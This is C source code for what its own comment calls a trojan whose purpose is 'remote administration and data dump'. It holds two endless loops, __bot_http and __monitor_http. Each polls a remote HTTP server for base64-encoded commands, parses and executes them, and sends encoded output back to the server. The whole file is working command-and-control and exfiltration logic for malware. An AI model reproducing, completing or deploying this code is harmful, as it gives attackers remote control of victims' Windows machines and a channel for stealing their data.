#include "api.h"
#include "misc.h"
#include "http.h"
#include "base64.h"
#include "command.h"
#include "task_reply.h"
#include "misc.h"

int last_command = 1;
int last_pop = 1;
int wait_minutes = 0;

unsigned long __stdcall __bot_http(void *params) {
	cmd_data data = { 0 };
	char *reply = (char *)_HeapAlloc(_GetProcessHeap(), HEAP_ZERO_MEMORY, 2048);
	char *pop_data = (char *)_HeapAlloc(_GetProcessHeap(), HEAP_ZERO_MEMORY, 2048);
	char *encoded = (char *)__alloc(4096);
	char *decoded = (char *)__alloc(4096);
	int option = 0;


	while (1) {
		while (__hxxp_connect() <= 0x00)
			__hxxp_close();

		if (__hxxp_reply(reply) != 0) {
			last_command = 0;
			if (reply) {
				if (__base64_decode(reply, _lstrlenA(reply), decoded) == TRUE)
					last_command = 1;
				__command_initialize(&data);
				if (__command_parser(decoded, &data) == 0)
					__command_control(&data);
				__command_free(&data);
			}
		}
		else {
			last_command = 0;
		}



		last_pop = 0;
		while ((option = __pop_reply(pop_data)) != -1) {
			last_pop = 1;
			if (__base64_encode(pop_data, _lstrlenA(pop_data), encoded) == TRUE)
				__hxxp_request(option, encoded, "");


			_ZeroMemory(pop_data, 2048);
			_ZeroMemory(encoded, 4096);
		}

		if (last_pop == 0 && last_command == 0) {
			if (wait_minutes >= 5)
				wait_minutes++;

			__wait_min(wait_minutes);
		}

		_ZeroMemory(reply, 2048);
		__hxxp_close();

	}
	return(0);
}


unsigned long __stdcall __monitor_http(void *params) {
	unsigned char *reply,*encoded_reply,*decoded_reply,*t_reply; //, *decoded_reply2;
	char *get_data;
	cmd_data data={0};
	int timer=0;
	char str_option[20] = {0};
	int option = 0;

	if((data.cmd = (unsigned char *)_HeapAlloc(_GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_COMMAND_LEN))==NULL)
		return(0xFFFFFFFF);
	if((data.arg = (unsigned char *)_HeapAlloc(_GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_ARGUMENT_LEN))==NULL)
		return(0xFFFFFFFF);
	if((data.token = (unsigned char *)_HeapAlloc(_GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_TOKEN_LEN))==NULL)
		return(0xFFFFFFFF);
	if((get_data = (unsigned char *)_HeapAlloc(_GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_REPLY_LEN))==NULL)
		return(0xFFFFFFFF);
	if((reply = (unsigned char *)_HeapAlloc(_GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_REPLY_LEN))==NULL)
		return(0xFFFFFFFF);
	if((decoded_reply = (unsigned char *)_HeapAlloc(_GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_DECODED_REPLY_LEN))==NULL) 
		return(0xFFFFFFFF);
	if((encoded_reply = (unsigned char *)_HeapAlloc(_GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_DECODED_REPLY_LEN))==NULL)
		return(0xFFFFFFFF);
	if((t_reply = (unsigned char *)_HeapAlloc(_GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_DECODED_REPLY_LEN))==NULL)
		return(0xFFFFFFFF);
/*
	if((decoded_reply2 = (unsigned char *)_HeapAlloc(_GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_DECODED_REPLY_LEN))==NULL) 
		return(0xFFFFFFFF);
		*/
	/************** MAIN LOOP ************/
	while(1) { // The trojan purposes is remote administration and data dump its main function loop comunication over HTTP/HTTPS or SOCKET
		if(__http_make_get(get_data,"0", "\x4a\x4a\x4a\x4a", "\x4a\x4a\x4a\x4a")>=0) { //two last arguments (padding)
			if(__http_read(get_data,(char *)reply)>=2) {
				if(__base64_decode((const char *)reply, _lstrlenA((char *)reply), decoded_reply)==1) {
					if(__command_parser((char *)decoded_reply, &data)==0) {
						if(__command_control(&data)!=-1)
							timer=0;
					}
				
				}
			}

		}


		while((option=__pop_reply((char *)t_reply))!=-1) {
			timer=0;
			if(__base64_encode((char *)t_reply,__strlen(t_reply), (char *)encoded_reply)==1) {
				_ZeroMemory(get_data, _lstrlenA(get_data));
				_ZeroMemory(str_option, 20);
				itoa(option, str_option, 10);
				if(__http_make_get(get_data, str_option, (char *)encoded_reply, (char *)"JJJJ")>=0) {
					_ZeroMemory(reply, MAX_REPLY_LEN);
					__http_reply(get_data, (char *)reply);			
				}
			}
			

			_ZeroMemory(encoded_reply, _lstrlenA((char *)encoded_reply));
			_ZeroMemory(t_reply, _lstrlenA(t_reply));
		}




		if(timer==60) {
			_Sleep(60000);
		}
		else {
			_Sleep(100*timer);
		}
		timer++;
		

		_ZeroMemory(data.cmd, MAX_COMMAND_LEN);
		_ZeroMemory(data.arg, MAX_ARGUMENT_LEN);
		_ZeroMemory(data.token, MAX_TOKEN_LEN);
		_ZeroMemory(reply, MAX_REPLY_LEN);
		_ZeroMemory(decoded_reply, MAX_DECODED_REPLY_LEN);
		_ZeroMemory(get_data, MAX_REPLY_LEN);
		_ZeroMemory(encoded_reply, MAX_REPLY_LEN);
		_ZeroMemory(t_reply, _lstrlenA(t_reply));
		//_ZeroMemory(decoded_reply2, MAX_DECODED_REPLY_LEN);
		_Sleep(100);
	} // END OF MAIN LOOP




	_ZeroMemory(data.cmd, MAX_COMMAND_LEN);
	_ZeroMemory(data.arg, MAX_ARGUMENT_LEN);
	_ZeroMemory(data.token, MAX_TOKEN_LEN);
	_ZeroMemory(reply, MAX_REPLY_LEN);
	_ZeroMemory(decoded_reply, MAX_DECODED_REPLY_LEN);
	//_ZeroMemory(decoded_reply2, MAX_DECODED_REPLY_LEN);
	_ZeroMemory(get_data, MAX_REPLY_LEN);
	_ZeroMemory(encoded_reply, MAX_REPLY_LEN);


	_HeapFree(_GetProcessHeap(), HEAP_NO_SERIALIZE, data.cmd);
	_HeapFree(_GetProcessHeap(), HEAP_NO_SERIALIZE, data.arg);
	_HeapFree(_GetProcessHeap(), HEAP_NO_SERIALIZE, data.token);
	_HeapFree(_GetProcessHeap(), HEAP_NO_SERIALIZE, reply);
	_HeapFree(_GetProcessHeap(), HEAP_NO_SERIALIZE, get_data);
	_HeapFree(_GetProcessHeap(), HEAP_NO_SERIALIZE, decoded_reply);
	_HeapFree(_GetProcessHeap(), HEAP_NO_SERIALIZE, encoded_reply);
	
	return 0;
}


